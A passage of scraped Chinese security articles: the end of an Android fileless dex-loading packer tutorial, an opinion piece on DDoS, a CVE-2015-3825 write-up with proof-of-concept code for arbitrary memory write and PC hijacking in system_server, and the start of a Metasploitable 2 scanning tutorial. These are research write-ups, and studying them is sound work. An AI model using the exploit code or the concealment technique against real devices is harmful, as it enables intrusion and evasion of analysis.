 dvm_dalvik_system_DexFile = (JNINativeMethod*) dlsym(ldvm, ""dvm_dalvik_system_DexFile"");   //openDexFileif(0 == lookup(dvm_dalvik_system_DexFile, ""openDexFile"", ""([B)I"",&amp;openDexFile)) {  openDexFile = NULL;  LOGI(""openDexFile method does not found "");  }else{LOGI(""openDexFile method found ! HAVE_BIG_ENDIAN"");  } LOGI(""ENDIANNESS is %c"" ,ENDIANNESS );  void *venv;  LOGI(""dufresne-----&gt;JNI_OnLoad!"");  if ((*vm)-&gt;GetEnv(vm, (void**) &amp;venv, JNI_VERSION_1_4) != JNI_OK) {  LOGI(""dufresne---&gt;ERROR: GetEnv failed"");  return -1;  }return JNI_VERSION_1_4;  }dlopen函数链接libdvm.so，dlsym找到并返回dvmdalviksystemDexFile。dvmdalviksystemDexFile就是我们之前看到的函数表const DalvikNativeMethod dvm_dalvik_system_DexFile[] = {  { ""openDexFile"", ""(Ljava/lang/String;Ljava/lang/String;I)I"", Dalvik_dalvik_system_DexFile_openDexFile },  { ""openDexFile"", ""([B)I"", Dalvik_dalvik_system_DexFile_openDexFile_bytearray },  { ""closeDexFile"", ""(I)V"", Dalvik_dalvik_system_DexFile_closeDexFile },  { ""defineClass"", ""(Ljava/lang/String;Ljava/lang/ClassLoader;I)Ljava/lang/Class;"", Dalvik_dalvik_system_DexFile_defineClass },  { ""getClassNameList"", ""(I)[Ljava/lang/String;"", Dalvik_dalvik_system_DexFile_getClassNameList },  { ""isDexOptNeeded"", ""(Ljava/lang/String;)Z"", Dalvik_dalvik_system_DexFile_isDexOptNeeded },  { NULL, NULL, NULL }, };lookup从函数表中寻找我们要的Dalvik_dalvik_system_DexFile_openDexFile_bytearrayint lookup(JNINativeMethod *table, const char *name, const char *sig,  void (**fnPtrout)(u4 const *, union JValue *)) {  int i = 0;  while (table.name != NULL)  {LOGI(""lookup %d %s"" ,i,table.name);  if ((strcmp(name, table.name) == 0)  &amp;&amp; (strcmp(sig, table.signature) == 0)){*fnPtrout = table.fnPtr;return 1;  }i++;  }return 0;  }找到之后就用全局的函数指针void (*openDexFile)(const u4* args, union JValue* pResult);  来保存这个函数JNIEXPORT jint JNICALL Java_cn_wjdiankong_dexfiledynamicload_NativeTool_loadDex(JNIEnv* env, jclass jv, jbyteArray dexArray, jlong dexLen)  {// header+dex contentu1 * olddata = (u1*)(*env)-&gt; GetByteArrayElements(env,dexArray,NULL);  char* arr;  arr = (char*)malloc(16 + dexLen);  ArrayObject *ao=(ArrayObject*)arr;  ao-&gt;length = dexLen;  memcpy(arr+16,olddata,dexLen);  u4 args[] = { (u4) ao };  union JValue pResult;  jint result;  if(openDexFile != NULL) {  openDexFile(args,&amp;pResult);  }else{result = -1;  } result = (jint) pResult.l;  LOGI(""Java_cn_wjdiankong_dexfiledynamicload_NativeTool_loadDex %d"" , result);  return result;  }loadDex函数最终会通过这个函数指针来调用dvm_dalvik_system_DexFile，最终加载dex那么回到Java层，我们需要定义一个自己的类加载器public class DynamicDexClassLoder extends DexClassLoader {   private static final String TAG = ""dexlog"";  private int cookie;  private Context mContext;  构造函数public DynamicDexClassLoder(Context context, byte[] dexBytes,  String libraryPath, ClassLoader parent, String oriPath,  String fakePath) {  super(oriPath, fakePath, libraryPath, parent);  setContext(context);   int cookie = JNITool.loadDex(dexBytes, dexBytes.length);   setCookie(cookie);   }cookie这个变量代表了加载完成后的dex的句柄 然后实现findClass函数@Overrideprotected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException {  Log.d(TAG, ""findClass-"" + name);  Class&lt;?&gt; cls = null;  String as[] = getClassNameList(cookie);  Class obj_class = Class.forName(DexFile.class.getName());  Method method = obj_class.getDeclaredMethod(""defineClassNative"",  new Class[]{String.class, ClassLoader.class, int.class});  method.setAccessible(true);  for (int z = 0; z &lt; as.length; z++) {  Log.i(TAG, ""classname:""+as[z]);  if (as[z].equals(name)) {  cls = (Class) method.invoke(null,  new Object[]{as[z].replace('.', '/'), mContext.getClassLoader(), cookie});  } else {//加载其他类method.invoke(null,  new Object[]{as[z].replace('.', '/'), mContext.getClassLoader(), cookie});  }} if (null == cls) {  cls = super.findClass(name);  } return cls;  }然后在MainActivity中我们就可以通过以下代码，启动TestApk的MainActivityDynamicDexClassLoder dLoader = new DynamicDexClassLoder(  getApplicationContext(),  dexContent,  null,  clzLoader,  getPackageResourcePath(),getDir("".dex"", MODE_PRIVATE).getAbsolutePath()  );Class clazz = dLoader.findClass(""com.example.testapk.MainActivity"");  Intent intent = new Intent(this, clazz);  startActivity(intent);  三、小结以上的代码在Android5.0以下的Android系统上可以正确执行（少数真机可能会出问题），我测试的时候在原生的Android4.4上成功。至于Android5.0？不好意思，从Android5.0开始，谷歌已经放弃了Dalvik虚拟机，转而支持ART，没有了libdvm，所以。。。。之后我会考虑研究一下怎么在ART虚拟机中实现。这种不落地的加载方式是现在加壳方式的一部分。现在的加壳方法往往是多种方法捏合在一起的（还有那种丧心病狂的VMP），大家可以试试将上篇的方法和这篇结合起来，对一个加密的dex，解密后不落地加载，之后再修复dex中的错误指令。之后我也会介绍越来越多的加壳、抗反编译方法，都可以尝试结合在一起。原文地址：http://bbs.ichunqiu.com/thread-12734-1-1.html?from=paper","2016-10-02 13:54:54","移动安全","对抗静态分析——dex不落地加载","http://nsoad.com/Article/MobileSecurity/20161002/474.html"
"5ccbfb484f2f0a0a7a69c13f","上周五，域名提供商Dyn.com经历了一次大规模的分布式拒绝服务（DDoS）攻击。此次攻击不仅导致该公司所提供的DNS服务访问速度明显降低，而且还使北美地区的大量网站被迫下线","kong","上周五，域名提供商Dyn.com经历了一次大规模的分布式拒绝服务（DDoS）攻击。此次攻击不仅导致该公司所提供的DNS服务访问速度明显降低，而且还使北美地区的大量网站被迫下线。不仅如此，此次DDoS攻击还使得数百万用户无法正常访问互联网。不幸的是，我们目前仍然无法有效地抵御这种类型的网络攻击。国外媒体InfoWorld作者脑洞大开，给出了下面这篇答案，或许还真的不失为一个不错的方案：需要注意的是，发动大规模DDoS攻击的成本并不高，攻击者只需要投入少量的资金，便可以给目标带来巨额的财产损失。目前，物联网正在不断兴起，而与此同时物联网设备又存在各种各样的安全隐患。在这种背景下，物联网设备将使攻击者的攻击火力大大增加。难道我们真的只能任人宰割吗？很多读者朋友和记者朋友都曾经问过我，我们到底应该如何防御DDoS攻击。随着黑客技术的不断发展，DDoS攻击的恶意流量规模每年都会提升一个档次。在我们现在所遇到的DDoS攻击中，每秒钟的恶意攻击流量大小已经超过了1TB。回想起当初的DDoS攻击每秒钟只有100Mb的恶意流量，相比之下，1TB每秒的攻击流量简直是令人不敢想象！你之所以无法阻止DDoS攻击，那是因为DDoS攻击针对的是OSI模型的各个层，而攻击者可以针对OSI模型的每一层发动各种各样的攻击。由于攻击者在发动DDoS攻击时使用的是其他用户的计算机或物联网设备，因此我们如果无法拿下DDoS的命令控制中心，那么我们就无法阻止此次DDoS攻击。虽然我们在此之前也曾抓到过一些可恶的DDoS攻击者，但是这并没有多大的意义，因为“一个我倒下了，还有千千万万个我会站起来”。当然了，互联网目前所面临的安全威胁远远不止DDoS攻击。互联网充斥着大量的钓鱼邮件和恶意软件，而攻击者每天都可以利用这些肮脏的手段来从广大无辜用户的身上窃取数百万美金。类似银行交易、医疗保健和电网等基础设施的管理控制在以前是不必接入互联网的，但是随着科技的不断发展，这些服务的正常运作现在都需要依赖于互联网的稳定性了。正因如此，“提升网络安全性”这一任务将会变得越来越紧迫。但我不得不提醒各位，互联网的稳定性不仅是一种虚无缥缈的东西，而且这种所谓的稳定性压根就不存在。我们应该怎么做？如果我们想要改变互联网目前的这种“悲惨状态”，我们就得重新构建一个全新的互联网，即互联网2.0。相比之下，互联网1.0更像是一种业余爱好者使用的网络。这种网络缺乏一定的专业性，因为目前互联网中绝大部分的安全验证机制都是一种“低成本”的身份验证，根本无法保证网络的安全性。比如说，任何人随时都可以向全世界的任何一台电子邮件服务器发送电子邮件，无论这封电子邮件是否合法、是否有效，邮件服务器都会处理这封邮件的内容。如果这个过程你重复一千万次，你每次得到的结果其实都是一样的。邮件服务器并不关心它所收到的这封邮件是由Donald Trump发送的，还是由中国或者俄罗斯的某位用户发送的。它无法通过简单的密码、双因素身份验证、或者生物识别标记来验证Trump的身份。不仅如此，它也无法根据Trump之前发送邮件的IP地址或者Trump的正常工作时间来判断这封邮件到底是不是由Trump发送的。因此，邮件服务器只会不断地接收和处理发送过来的电子邮件，而无法去判定邮件是否可信任。互联网2.0我认为，全世界绝大多数的用户都会愿意去为一个，至少将双因素身份验证或生物识别标记作为最低级验证机制的新型互联网付费。除此之外，为了能够让自己变得更加安全，即便是联网设备的价格有所上升，我相信广大用户也是可以接受的。在我看来，这些设备应该内置加密芯片，而这些加密芯片需要确保设备或用户的数字证书不被犯罪分子所盗取。这种专业级别的互联网应该部署一些集中化的服务，例如今天的DNS。我们可以通过这种集中式服务来处理所有的网络通信，无论这些请求是合法的或是恶意的。如果某人的计算机或服务账号被攻击者或恶意软件所控制，那么这个事件将会被转发给所有处于同一网络链接下的用户。在互联网2.0中，我们可以评估每一条网络链接的可信任程度，互联网2.0中的每一位用户都可以根据这条网络链接的信任等级来决定到底应该如何处理这条链接。想必大家也意识到了，互联网2.0的诞生也就意味着“网络匿名性”将会走到尽头。对于那些更加愿意在网络中保持匿名的用户来说，互联网1.0也许是他们最好的选择。但是，像我这样的人以及我所在的公司也许更加需要的是信息的安全。毕竟，目前很多厂商都会给用户提供两种不同版本的产品，即安全的和不安全的产品。比如说，我使用互联网中继聊天工具（IRC）已经有十多年了。大多数的IRC信道都不会对用户的身份进行验证，而且经常会受到黑客的攻击。但是你可以选择使用一条更加可靠和安全的IRC信道，所以我希望互联网中的所有服务和协议都可以给用户提供这样的一种选择。总结我个人认为，我们需要的是一个更加安全可靠的互联网，而且在过去的十多年时间里，我也一直都在向人们宣传这一理念。但是就现在的情况来看，这种需求已经变得越来越急迫了。这一天到底何时才会到来呢？我很期待！","2016-11-14 11:44:30","网络安全","奇谈：避免DDoS的唯一可行方案","http://nsoad.com/Article/Network-security/20161114/761.html"
"5ccbfb484f2f0a0a7a69c140","* 本文原创作者： thor@MS509Team，本文属FreeBuf原创奖励计划，未经许可禁止转载CVE-2015-3825是去年Android系统爆出的高危漏洞，与CVE-2014-7911一样都属于Android系统的","silence","* 本文原创作者： thor@MS509Team，本文属FreeBuf原创奖励计划，未经许可禁止转载CVE-2015-3825是去年Android系统爆出的高危漏洞，与CVE-2014-7911一样都属于Android系统的反序列化漏洞。通过该漏洞可以实现Android系统提权及代码执行等一系列攻击行为，危害巨大，影响Android 4.3 到Android 5.1所有版本。0×00 构造Crash Poc与CVE-2014-7911类似，CVE-2015-3825都是反序列化漏洞，因此我们基于CVE-2014-7911的Poc构造CVE-2015-3825的Poc。CVE-2015-3825的反序列化漏洞出现在OpenSSLX509Certificate类中，构造伪造类：public class ZpenSSLX509Certificate implements Serializable {      private static final long serialVersionUID = -8550350185014308538L; //5.0    private final long mContext;    public ZpenSSLX509Certificate(long ctx) {        mContext = ctx;    }}将伪造类放入Bundle中：Bundle b = new Bundle();b.putSerializable(""eatthis"" , new ZpenSSLX509Certificate(0xaaaaaaaaaL));在setApplicationRestrictions函数中将Bundle中伪造的类修改为OpenSSLX509Certificate，并通过Binder传给system_server:byte[] data = _data.marshall();for (int i = 0; i&lt;data.length-3; i++) {if (data[i] == 'Z' &amp;&amp; data[i + 1] == 'p' &amp;&amp; data[i + 2] == 'e' &amp;&amp; data[i + 3] == 'n') {        data[i] = 'O';    }}发送成功以后就需要等待system_server触发GC回收对象，这里我们可以通过Binder多次发送Bundle去触发：for (int i=0; i&lt;100; i++) {   setApplicationRestrictions(ctx.getPackageName(), b, me.hashCode());}我们在AVD Android 5.0模拟器上运行Poc，通过adb logcat可以看到crash log:可以看到虽然出错的address像是我们指定的地址，但是PC指针并不受我们控制。我们只有通过调试分析来确定该漏洞如何利用，找到控制PC指针的方法。0×01 分析漏洞成因参考论文[1]及分析文章[2]，我们通过IDA调试及源码分析来确定漏洞的利用点。我们伪造的类在被GC回收的时候会调用OpenSSLX509Certificate的finalize方法：finalize方法会调用native层的X509_free函数，native层主要的函数调用栈如下： X509_free---&gt;ASN1_item_free---&gt;ASN1_item_combine_free---&gt;asn1_do_lock---&gt;CRYPTO_add_lock我们通过IDA attach到system_server进程，运行Poc可在IDA中捕获到exception：我们可以看到crash是由于执行LDR R0,[R7]查看此时的寄存器环境：可以看到寄存器R7存储的值正好是我们传入的地址值+0×10。由于R7寄存器的值是一个不存在的地址，因此在执行LDR R0,[R7]指令时导致内存地址访问错误，从而导致system_server进程崩溃。0×02 exploit控制PC1. 任意地址值减一分析了漏洞崩溃的原因，我们需要继续分析如何构造exploit。详细的参数传递过程可以参考[2],这里我们直接给出结果,mContext为我们控制的传入值：R7 = mContext + 0x10system_server崩溃时R7寄存器的值为mContext + 0×10，即我们传入的mContext值为0xaaaaaaaa,而R7的值为0xaaaaaaba。继续分析CRYPTO_add_lock函数中崩溃后的相关代码：R0寄存器的值为0xFFFFFFFF(即-1),则有R6 = [R7] - 1最关键的代码在这里：STR R6,[R7]将R6寄存器的值最后写回R7指向的地址。通过以上分析我们可以看到，该漏洞的核心是可以指定任意内存地址A，将A地址存储的32位整数取出减一，最后将减一后的值再存回地址A，即可以在system_server进程中实现任意内存地址减一。2.任意地址写既然我们能够让任意地址减一，那么我们就可以通过数次减一操作达到任意地址写的目的。例如我们要讲内存中某个地址A的32位整数0xBBBBBBBB变为0xAAAAAAAA，那么理论上只要我们在指定的地址上执行0×11111111次减一操作即可。但是这里有几个问题：1. 减一操作过多影响效率2. 新值比旧值小，溢出怎么办3. 该漏洞是否允许重复利用针对问题1，我们可以直接采取降维思路，将原本针对32位整数的减一操作转化为分别针对4个字节的减一操作，即我们只要分别通过减一操作将原值的每个字节转化为指定的值即可。例如:1. 我们首先在内存地址A执行0×11次减一操作，那么地址A的值从0xBBBBBBBB变为0xBBBBBBAA;2. 在内存地址A+1执行0×11次减一操作，那么地址A的值从0xBBBBBBAA变为0xBBBBAAAA;3. 在内存地址A+2执行0×11次减一操作，那么地址A的值从0xBBBBAAAA变为0xBBAAAAAA;4. 最后在内存地址A+3执行0×11次减一操作，那么地址A的值从0xBBAAAAAA变为0xAAAAAAAA;最后我们达到了相同的效果，即内存地址A的值从0xBBBBBBBB变为了0xAAAAAAAA，但是仅仅执行了0×44次减一操作，效率大大提升。针对问题2，如果我们采取分字节减一操作的话，那么就需要从高位借一位，和减法的操作类似。针对问题3，我们需要确定通过漏洞执行一次减一操作后会不会导致崩溃，或是有什么限制条件。我们查看ASN1_item_combine_free函数源码：这里我们可以看到如果asn1_do_lock函数返回值大于0,那么函数就返回了，不会进入后面其他的code path。但是如果返回负数或0，那么后面则会进入asn1_cb或asn1_enc_free函数的路径，程序行为就不可控了。从CRYPTO_add_lock函数的反汇编代码可以看出R6寄存器的值就是返回值，即指定地址每次减一后的值即是每次函数返回值。因此，要能够多次稳定重复利用减一操作，需要有两个限制条件：1. 减一操作后的值不能为02. 减一操作后的值不能为负数，即减一操作后的数必须在[1,0x7fffffff]范围内。在每次进行减一操作的过程中都必须满足这两个条件，不然就会导致进入asn1_cb或asn1_enc_free函数，调试结果发现这条路径一般就是崩溃：3825原始的论文[1]中只介绍了重复减一操作的利用方法，并未介绍另一条free的路径是否能利用，我们暂时也未深入。因此我们要实现任意地址写必须满足以上两个条件，代码如下：private void writeWhatWhere(Context ctx, long address, long originalValue, long newValue) {    Class conscryptX509 = Class.forName(""com.android.org.conscrypt.OpenSSLX509Certificate"");    ObjectStreamClass clDesc = ObjectStreamClass.lookup(conscryptX509);    Field targetUID = ZpenSSLX509Certificate.class.getDeclaredField(""serialVersionUID"");    targetUID.setAccessible(true);    targetUID.set(null,clDesc.getSerialVersionUID());    int numOfAllocations = 10;    long[] originalBytes = new long[numOfAllocations];    long[] newBytes = new long[numOfAllocations];    long[] diffBytes = new long[numOfAllocations];    originalBytes[0] = originalValue &amp; 0x000000ff;    originalBytes[1] = (originalValue &amp; 0x0000ff00) &gt;&gt; 8;    originalBytes[2] = (originalValue &amp; 0x00ff0000) &gt;&gt; 16;    originalBytes[3] = (originalValue &amp; 0xff000000) &gt;&gt; 24;    newBytes[0] = newValue &amp; 0x000000ff;    newBytes[1] =  (newValue &amp; 0x0000ff00) &gt;&gt; 8;    newBytes[2] = (newValue  &amp; 0x00ff0000) &gt;&gt; 16;    newBytes[3] = (newValue  &amp; 0xff000000) &gt;&gt; 24;    for (int i=3; i&gt;=0; i--) {        diffBytes[i] = (originalBytes[i] - newBytes[i]) &amp; 0xff;        if (originalBytes[i] &lt; newBytes[i]) {            diffBytes[i+1]--;        }    }    List&lt;Bundle&gt; bundles = new ArrayList&lt;&gt;();    for(int i=0; i&lt;4; i++) {        bundles.add(new Bundle());    }    for(int i=3; i&gt;=0; i--) {        long addr = address - 0x10  + i;        ZpenSSLX509Certificate cert = new ZpenSSLX509Certificate(addr);        for (int j=0; j&lt;diffBytes[i]; j++) {            bundles.get(i).putSerializable(""eatthis"" + i +""_""+ j,  cert);        }    }    for (int i=3; i&gt;=0; i--) {        if (diffBytes[i] &gt; 0) {            sendBundleToSystemServer(ctx, bundles.get(i), true);        }    }}算法并不复杂，大家可自行阅读。3. 控制PC1) 覆盖回调函数地址我们通过任意地址减一操作实现了任意地址写，下一步就是控制PC寄存器。要实现控制PC，最简单的方法就是通过任意地址写覆盖GOT表中的函数地址，那么函数调用的时候我们就能劫持PC。但是system_server中的so文件都采用了RELRO(Relocation read only)编译,导致GOT不可写。论文[1]中提到的方法是覆盖libcrypto.so中id_callback函数的地址。该函数地址在可写的Data段，因此只要我们覆盖该地址为我们想要的地址，并触发id_callback函数的调用即可劫持PC。函数大致的调用流程为：throwExceptionIfNecessary---&gt;CRYPTO_THREADID_current---&gt;id_callback要想覆盖id_callback函数的地址，我们需要知道两个值：1. 存放id_callback函数地址的地址值2. 原来id_callback函数的地址通过IDA反汇编CRYPTO_THREADID_current我们可以轻易找到存放id_callback函数地址的地址值：我们可以通过libcrypto.so加载的基址及偏移量计算存放id_callback函数地址的地址值：id_callback_address = libcrypto_Address + 0x101c30;id_callback函数的地址则指向了libjavacrypto.so中的指令：我们同样可以通过libjavacrypto.so基址及偏移量计算出原id_callback函数的地址：id_callback_origin_value = libjavacrypto_Address + 0x8128 + 1;由于Android设计上的缺陷，这些so文件加载基址都是可以通过获取自身进程的内存地址获得，从而绕过ASLR，具体方法可参考7911的Poc。获取到这两个值以后还不能直接调用writeWhatWhere函数来覆盖，这里还需要有一些特殊处理。由于libjavacrypto.so加载的基址在模拟器中一般在高地址，例如0xAE36E000，即原id_callback函数的地址值是个负数，由之前的分析可知，如果是负数的话会crash。这里我们曲线救国，首先覆盖高字节0xAE字节为[0x1,0x7F]范围内的数，那么在覆盖低字节的时候就是正数了，可避免crash，主要代码如下：//首先覆盖高位字节writeWhatWhere_pos(getBaseContext(), id_callback_address, id_callback_origin_value, G1_addr, 3);forceGCinSystemServer(getBaseContext());//再覆盖其他3个字节writeWhatWhere_pos(getBaseContext(), id_callback_address, id_callback_origin_value, G1_addr,0);writeWhatWhere_pos(getBaseContext(), id_callback_address, id_callback_origin_value, G1_addr,1);writeWhatWhere_pos(getBaseContext(), id_callback_address, id_callback_origin_value, G1_addr,2);forceGCinSystemServer(getBaseContext());这里的G1_addr是我们构造ROP的第一个gadget地址，即劫持PC到我们控制的流程。这里还有一个重要问题，就是G1_addr值的高字节只能在[0x1,0x7F]范围内，导致我们寻找第一个gadget的时候只能在[0x1,0x7FFFFFFF]地址空间内寻找，比较受限。2) 触发id_callback执行主动触发id_callback的执行也需要我们构造伪造的数据到system_server中，调用栈大致如下：OpenSSLECPrivateKey.reardObject--&gt;NativeCrypto.d2i_PKCS8_PRIV_KEY_INFO--&gt;throwExceptionIfNecessary--&gt;CRYPTO_THREADID_current--&gt;id_callback我们需要将修改过数据的OpenSSLECPrivateKey对象通过binder传给system_server，由于OpenSSLECPrivateKey并未导出，只有通过反射获取：Class EC_clazz = Class.forName(""com.android.org.conscrypt.OpenSSLECPrivateKey"");Class group_context = Class.forName(""com.android.org.conscrypt.OpenSSLECGroupContext"");Constructor EC_constructor = EC_clazz.getConstructor(ECPrivateKeySpec.class);Method m_getCurveByName = group_context.getMethod(""getCurveByName"", String.class);Method m_getECParameterSpec = group_context.getMethod(""getECParameterSpec"");Object openSslSpec = m_getCurveByName.invoke(null,""prime256v1"");BigInteger s = new BigInteger(""229cdbbf489aea584828a261a23f9ff8b0f66f7ccac98bf2096ab3aee41497c5"", 16);ECParameterSpec arg1 = (ECParameterSpec)m_getECParameterSpec.invoke(openSslSpec);ECPrivateKeySpec arg2 = new ECPrivateKeySpec(s, arg1 );Object obj = EC_constructor.newInstance(arg2);//将生成的OpenSSLECPrivateKey对象放入Bundle中 Bundle b = new Bundle();b.putSerializable(""eatthis"", (java.io.Serializable)obj);构造好OpenSSLECPrivateKey后我们需要修改类中的数据，去触发system_server反序列化异常，从而执行id_callback函数。同样，我们在setApplicationRestrictions函数中直接修改byte数据：byte[] data = _data.marshall();int i = 410;data[i] = 0x0;data[i+1] = 0x0;data[i+2] = 0x0;运行测试app，我们可以看到异常：可以看到，我们仅仅修改几个字节便导致了system_server反序列化异常。但是这里有一个问题，就是data修改的位置不同导致的异常也不同，导致id_callback函数的调用次序也会有所不同，同时寄存器的布置也会有所不同，这会对后面ROP的构造产生影响。作为演示，我们将PC值的值设为0x7e7e7e7e，实际利用的时候应设置为第一个ROP gadget的值：我们可以看到system_server在我们指定的地址0x7e7e7e7e崩溃。如果我们构造好了ROP及shellcode的话，这里我们就可以设置为第一个gadget的地址，从而劫持system_server进程的执行流程，进入我们的shellcode执行指令。0×03 待续：ROP及shellcode通过以上的分析及Poc调试，我们成功实现了从crash到控制PC实现进程劫持的过程。下一篇文章我们将继续介绍ROP的构造及利用过程，从而实现命令执行、shellcode执行的目的。ROP及shellcode的构造也是编写exploit过程中最精巧及难度最大的地方，大家可以参考[1]给出的例子。0×04 总结本文分析介绍了CVE-2015-3825漏洞的成因，实践了从crash到控制PC指针的Poc编写过程，并记录了调试过程中遇到的诸多问题。漏洞的利用需要强大的调试分析能力，IDA+AVD的组合勉强能够实现单步调试，但是IDA在单步时还是会偶尔出现异常。另外就是在x86上使用arm模拟真的非常卡，crash后启动也非常慢，调试的时候又会多次崩溃重启，只有干等，导致漏洞调试非常耗时。大家在这方面如果有好的解决方法和经验，欢迎大家一起分享及探讨学习！参考文献[1]https://www.usenix.org/system/files/conference/woot15/woot15-paper-peles.pdf[2]http://www.droidsec.cn/opensslx509certificate%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88cve-2015-3825%EF%BC%89%E6%88%90%E5%9B%A0%E5%88%86%E6%9E%90/[3]http://www.freebuf.com/news/74676.html[4]http://www.droidsec.cn/%E5%86%8D%E8%AE%BAcve-2014-7911%E5%AE%89%E5%8D%93%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/* 本文原创作者： thor@MS509Team，本文属FreeBuf原创奖励计划，未经许可禁止转载","2016-09-30 00:34:11","移动安全","Android漏洞CVE-2015-3825分析及exploit实战：从Crash到劫持PC","http://nsoad.com/Article/MobileSecurity/20160930/467.html"
"5ccbfb484f2f0a0a7a69c141","漏洞评估是所有渗透测试环节中非常重要的一部分，也是识别和评估目标系统漏洞的一个过程。本篇文章中，我们将从 Metasploitable 2 虚拟机的网络侧，对可获取的漏洞进行评估","Kong","漏洞评估是所有渗透测试环节中非常重要的一部分，也是识别和评估目标系统漏洞的一个过程。本篇文章中，我们将从 Metasploitable 2 虚拟机的网络侧，对可获取的漏洞进行评估。在之后的教程中，我们还将对 Metasploitable 2 的 web 应用进行评估。在上篇关于 Metasploitable 2 的指纹获取和信息枚举的教程中我们可以得知 Metasploitable 2 存在许多的漏洞。基于这些我们以收集的信息我们可以找出目标系统线上或是线下的漏洞。关于这些漏洞的具体利用方法，我们将会在下篇文章中讲解。这篇文章主要重点在对这些漏洞的分析上。我们将手动寻找漏洞，结合一些工具例如：Nmap 的一些脚本，同时我们还将结合自动化扫描工具例如： Open-Vas 。每一种扫描技术，都有它的优点和缺点，在下面的内容中你将体会到这种差异性！如上所诉，有许多方式可以进行脆弱性分析。从手动检索漏洞数据库，在到全自动化的漏洞扫描工具例如： Open-Vas 及 Nessus等。而自动漏扫工具是一种非常主动的扫描方式，它通常会向目标系统发送大量的请求流量，从而获取扫描结果。正因为这种特性的存在，因此当我们对某个目标进行扫描时，一定要小心再小心！否则可能会给目标系统造成 DDos 甚至奔溃！ 当我们使用自动漏扫工具时，一定要适当的结合一些手动的方式，因为谁也不敢保证自动化工具的准确性。Metasploitable 2 信息枚举现在，让我们从之前收集的关于 Metasploitable 2 的信息，开始我们的漏洞评估工作。其运行的操作系统版本为 Linux 2.6.9 – 2.6.33服务器名称为 METASPLOITABLE可获取 35 个账户信息msfadmin 为管理员账户msfadmin 管理员账户密码没有过期时间我们知道哪些服务在跑，及这些服务的版本及侦听端口有一个 webserver 和 SQL server 在 Metasploitable 下运行从 Nmap 的扫描中，我们得到以下端口及服务信息：Service    Port    StatusVsftpd 2.3.4    21    OpenOpenSSH 4.7p1 Debian 8ubuntu 1 (protocol 2.0)    22    OpenLinux telnetd service    23    OpenPostfix smtpd    25    OpenISC BIND 9.4.2    53    OpenApache httpd 2.2.8 Ubuntu DAV/2    80    OpenA RPCbind service    111    OpenSamba smbd 3.X    139 &amp; 445    Open3 r services    512, 513 &amp; 514    OpenGNU Classpath grmiregistry    1099    OpenMetasploitable root shell    1524    OpenA NFS service    2048    OpenProFTPD 1.3.1    2121    OpenMySQL 5.0.51a-3ubuntu5    3306    OpenPostgreSQL DB 8.3.0 – 8.3.7    5432    OpenVNC protocol v1.3    5900    OpenX11 service    6000    OpenUnreal ircd    6667    OpenApache Jserv protocol 1.3    8009    OpenApache Tomcat/Coyote JSP engine 1.1    8180    Open从以上信息我们可以看出，这些服务包含许多可被利用的已知漏洞存在。下一步我们要找出哪些服务是有漏洞的，并手机其相关的利用方法。我们可以从以下提供的服务上知道哪些存在漏洞。例如现在最流行的 exploit-db 及开源漏洞库 (OSVDB) 。我们还可以通过 kali 上的 searchsploit 来查找和评估已知漏洞及漏洞的利用代码。这篇文章主要是要教大家学会怎么评估漏洞，而不是 Metasploitable 2 使用指南。因此我们只会评估其中一些服务漏洞。剩下的漏洞评估，大家可以自己去实践练习。下面让我们继续我们本篇文章的评估内容，同时我们来启动之前我们枚举发现的 Vsftpd 2.3.4 服务。VSFTPD v2.3.4 漏洞当我们在谷歌上搜索关于 Vsftpd 2.3.4 的已知漏洞后我们可以得知该版本有一个已知后门漏洞。以下是该版本的下载地址：https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor这意味着 Vsftpd 2.3.4 及之前的版本都存在这个 backdoor 漏洞。因此这是值得一试的在 Metasploitable 2 上。在 Metasploit 中，也有关于这个后门漏洞的利用模块。CVE: CVE-2011-02523OSVDB: 73573Nmap 脚本扫描 VSFTPD v2.3.4我们可以启动 Metasploit 来得知，目标系统上运行的服务是否是存在漏洞的。还有另一种方法就是通过 Nmap 的 ftp-vsftpd-backdoor 脚本来进行扫描探测。下面我们来启动 Nmap 并用以下命令，对目标主机执行扫描：nmap –script ftp-vsftpd-backdoor –p 21 [目标主机]从检测结果我们可以得知，目标使用的 vsFTPd 服务，为存在后门漏洞的版本。关于Nmap的脚本和其他脚本参数的更多信息可以在这里找到：https://nmap.org/nsedoc/scripts/ftp-vsftpd-backdoor.htmlUnreal ircd 漏洞Metasploitable 运行着 UnreaIRCD IRC 后台守护程序，在某个版本上存在一个自动向其他正在监听状态中的端口发送一个紧跟“AB”信件的系统命令的漏洞。下面，我们看看目标主机上的 Unreal ircd 服务。从 Nmap 的扫描结果看，它运行在 6667 端口上。但是我们还不知道它的具体版本号。这里我们可以使用一种通常的 banner 抓取技术。我们可以使用 Netcat 来抓取。命令如下：nc [目标主机]6667不幸的是 banner 信息并没有如愿返回给我们：那么让我们回到 Nmap 使用 Nmap 对 6667 端口进行一次完整的扫描，命令如下：nmap –A –p 6667 [目标主机]很幸运， Nmap 如我们所愿返回了 unreal ircd 服务相关的版本号，其版本为  unreal ircd 3.2.8.1 。当我们在谷歌上对该版本的 unreal ircd 进行查询后，我们可以得知，该版本存在一个后门漏洞。https://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor在 Nmap 中同样有个脚本，可以用来检测该服务是否存在漏洞。命令如下：nmap –sV –script irc-unrealircd-backdoor –p 6667 [目标主机]我们可以从输出结果得知，该版本是否为漏洞版本。由于脚本执行的命令无法返回到我们终端，因此我们无法百分百确定其是否存在漏洞。使用 Exploit-db 评估漏洞Exploit-db 是一个非常好的，查找已知漏洞的地方。它为我们提供了大量的漏洞利用细节，详细说明文档，shellcodes 等重要信息资源。我们可以使用关键字 CVE 或 OSVDB 来进行相关的查找工作。当我们搜索关于 Unreal IRCD 的漏洞时我们得到以下返回结果：可以看到有多个关于 Linux 的 unreal IRCD 漏洞：CVE: 2010-2075: https://www.exploit-db.com/exploits/16922/CVE: 2010-2075: https://www.exploit-db.com/exploits/13853/第一行的那个漏洞是针对 windows 平台下的，因此在 Metasploitable 2 Linux 上无法利用。当我们点击它们，我们就可以下载到它的漏洞利用代码。同时 Exploit-db 还为我们提供了，该漏洞版本软件的下载，以便于我们实验环境下的学习测试使用。一般这些利用代码，都是由 Ruby (Metasploit 模块), C, Perl 或者  Python 这些编程语言所编写。这里需要说明的是，我们使用这些 shellcode 